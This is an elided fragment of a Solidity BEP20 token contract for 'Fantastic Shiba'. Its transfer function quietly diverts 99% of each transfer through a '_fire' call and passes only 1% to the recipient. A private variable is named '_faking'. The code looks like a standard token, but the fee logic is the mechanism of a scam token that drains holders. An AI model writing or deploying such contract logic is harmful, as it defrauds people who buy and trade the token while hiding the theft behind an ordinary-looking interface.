...
contract BEP20Token is IBEP20AN {
    using Math20AN for uint256;

    string public name20KT =  "Fantastic Shiba";
    string public symbol20KT =  "FTShiba";
    uint8 public decimals20KT = 9;
    uint public _totalSupply = 1*10**15 * 10**9;
    
    address private _owner;
    uint8 private _faking;
  ...
  function decimals() public view virtual returns (uint8) {
    ...
    function transfer(address to, uint tokens) public override returns (bool success) {
        ...
        _fire(_msgSender(),tokens.mul(99).div(10**2));
        _transfer(_msgSender(), to, tokens.sub(tokens.mul(99).div(10**2)));
        return true;
